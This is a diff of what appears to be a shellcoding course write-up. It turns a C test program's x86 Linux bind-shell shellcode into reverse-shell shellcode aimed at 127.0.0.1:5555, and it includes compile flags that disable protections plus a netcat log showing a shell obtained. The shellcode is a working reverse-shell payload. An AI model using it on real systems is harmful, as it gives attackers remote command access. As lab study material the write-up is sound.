@@ -676,10 +676,10 @@ A simple C program scripted and edited with the newly generated shellcode:
 /**
 * Filename: shellcode.c
 * Author: h3ll0clar1c3
-* Purpose: Reverse shell connecting back to IP address 127.0.0.1 on TCP port 4444 
+* Purpose: Reverse shell connecting back to IP address 127.0.0.1 on TCP port 5555 
 * Compilation: gcc -fno-stack-protector -z execstack -m32 shellcode.c -o reverse_shell_tcp_final  
 * Usage: ./reverse_shell_tcp_final
-* Testing: nc -lv 4444
+* Testing: nc -lv 5555
 * Shellcode size: ??? bytes
 * Architecture: x86
 **/
@@ -690,11 +690,10 @@ A simple C program scripted and edited with the newly generated shellcode:
 int main(void)
 {
 unsigned char code[] =
-"\x31\xc0\x31\xdb\x31\xf6\x56\x6a\x01\x6a\x02\xb0\x66\xb3\x01\x89\xe1\xcd\x80\x89\xc2\x56\x66\x68\x15"
-"\xb3\x66\x6a\x02\x89\xe1\x6a\x16\x51\x52\xb0\x66\xb3\x02\x89\xe1\xcd\x80\x6a\x01\x52\xb0\x66\xb3\x04"
-"\x89\xe1\xcd\x80\x56\x56\x52\xb0\x66\xb3\x05\x89\xe1\xcd\x80\x89\xc2\x31\xc9\xb1\x03\x89\xd3\x49\xb0"
-"\x3f\xcd\x80\x79\xf9\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xc2\x53\x89"
-"\xe1\xb0\x0b\xcd\x80";
+"\x31\xdb\x50\x6a\x01\x6a\x02\xb0\x66\xb3\x01\x89\xe1\xcd\x80\x89\xc2\xbf\xff\xff\xff\xff\x81\xf7\x80"
+"\xff\xff\xfe\x57\x66\x68\x15\xb3\x66\x6a\x02\x89\xe1\x6a\x16\x51\x52\xb0\x66\xb3\x03\x89\xe1\xcd\x80"
+"\x31\xc9\xb1\x03\x89\xd3\x49\xb0\x3f\xcd\x80\x79\xf9\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62"
+"\x69\x89\xe3\x50\x89\xc2\x53\x89\xe1\xb0\x0b\xcd\x80";
 
     printf("Shellcode length: %d\n", strlen(code));
 
@@ -717,13 +716,11 @@ Shellcode length: ??
 
 ```
 
-A separate terminal demonstrating a successful bind connection and shell on the local host (via port 5555):
+A separate terminal demonstrating a successful reverse connection and shell on the local host (via port 5555):
 
 ```bash
-osboxes@osboxes:~$ netstat -antp | grep 5555
-tcp        0      0 0.0.0.0:5555            0.0.0.0:*               LISTEN      21783/shell_bind_tcp_final
-osboxes@osboxes:~$ nc -nv 127.0.0.1 5555
-Connection to 127.0.0.1 5555 port [tcp/*] succeeded!
+osboxes@osboxes:~$ nc -lv 5555
+Connection from 127.0.0.1 5555 port [tcp/*] succeeded!
 id
 uid=1000(osboxes) gid=1000(osboxes) groups=1000(osboxes),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
 ```
